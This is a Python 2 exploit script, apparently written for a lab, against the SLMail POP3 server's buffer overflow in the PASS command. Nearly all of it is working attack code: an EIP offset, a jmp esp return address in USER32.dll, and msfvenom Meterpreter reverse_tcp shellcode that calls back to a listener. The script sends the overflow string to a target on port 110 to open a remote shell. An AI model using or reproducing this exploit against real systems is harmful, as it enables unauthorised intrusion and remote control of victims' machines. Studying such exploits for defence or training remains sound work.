# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in SLMail. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.




# EIP offset: 4654
# 0x7e455af7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.4.17 LPORT=4444 -b '\x00\x0A\x0D' -f python

import sys
import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buf =  ""
buf += "\xba\x49\x2c\xbf\xe3\xdb\xce\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x56\x83\xee\xfc\x31\x56\x0f\x03\x56\x46\xce"
buf += "\x4a\x1f\xb0\x8c\xb5\xe0\x40\xf1\x3c\x05\x71\x31\x5a"
buf += "\x4d\x21\x81\x28\x03\xcd\x6a\x7c\xb0\x46\x1e\xa9\xb7"
buf += "\xef\x95\x8f\xf6\xf0\x86\xec\x99\x72\xd5\x20\x7a\x4b"
buf += "\x16\x35\x7b\x8c\x4b\xb4\x29\x45\x07\x6b\xde\xe2\x5d"
buf += "\xb0\x55\xb8\x70\xb0\x8a\x08\x72\x91\x1c\x03\x2d\x31"
buf += "\x9e\xc0\x45\x78\xb8\x05\x63\x32\x33\xfd\x1f\xc5\x95"
buf += "\xcc\xe0\x6a\xd8\xe1\x12\x72\x1c\xc5\xcc\x01\x54\x36"
buf += "\x70\x12\xa3\x45\xae\x97\x30\xed\x25\x0f\x9d\x0c\xe9"
buf += "\xd6\x56\x02\x46\x9c\x31\x06\x59\x71\x4a\x32\xd2\x74"
buf += "\x9d\xb3\xa0\x52\x39\x98\x73\xfa\x18\x44\xd5\x03\x7a"
buf += "\x27\x8a\xa1\xf0\xc5\xdf\xdb\x5a\x81\x2c\xd6\x64\x51"
buf += "\x3b\x61\x16\x63\xe4\xd9\xb0\xcf\x6d\xc4\x47\x46\x79"
buf += "\xf7\x98\xe0\xea\x09\x19\x10\x22\xce\x4d\x40\x5c\xe7"
buf += "\xed\x0b\x9c\x08\x38\xa1\x96\x9e\x03\x9d\xa3\x4f\xec"
buf += "\xdf\xab\x7e\xb0\x56\x4d\xd0\x18\x38\xc2\x91\xc8\xf8"
buf += "\xb2\x79\x03\xf7\xed\x9a\x2c\xd2\x85\x31\xc3\x8a\xfe"
buf += "\xad\x7a\x97\x75\x4f\x82\x02\xf0\x4f\x08\xa6\x04\x01"
buf += "\xf9\xc3\x16\x76\x9e\x2b\xe7\x87\x0b\x2b\x8d\x83\x9d"
buf += "\x7c\x39\x8e\xf8\x4a\xe6\x71\x2f\xc9\xe1\x8e\xae\xfb"
buf += "\x9a\xb9\x24\x43\xf5\xc5\xa8\x43\x05\x90\xa2\x43\x6d"
buf += "\x44\x97\x10\x88\x8b\x02\x05\x01\x1e\xad\x7f\xf5\x89"
buf += "\xc5\x7d\x20\xfd\x49\x7e\x07\x7d\x8d\x80\xd5\xaa\x36"
buf += "\xe8\x25\xeb\xc6\xe8\x4f\xeb\x96\x80\x84\xc4\x19\x60"
buf += "\x64\xcf\x71\xe8\xef\x9e\x30\x89\xf0\x8a\x95\x17\xf0"
buf += "\x39\x0e\xa8\x8b\x32\xb1\x49\x6c\x5b\xd6\x4a\x6c\x63"
buf += "\xe8\x77\xba\x5a\x9e\xb6\x7e\xd9\x91\x8d\x23\x48\x38"
buf += "\xed\x70\x8a\x69"


evilString = "A" * 4654 + "\xf7\x5a\x45\x7e" + "\x90" * 10 + buf + "\x90"*800

print "[+] Sending payload"

s.connect(('192.168.4.18',110))
print s.recv(1024)

s.send("USER anon\r\n")
print s.recv(1024)
s.send("PASS "+ evilString+"\r\n")
print s.recv(1024)

print "[+] Payload sent successfully!"
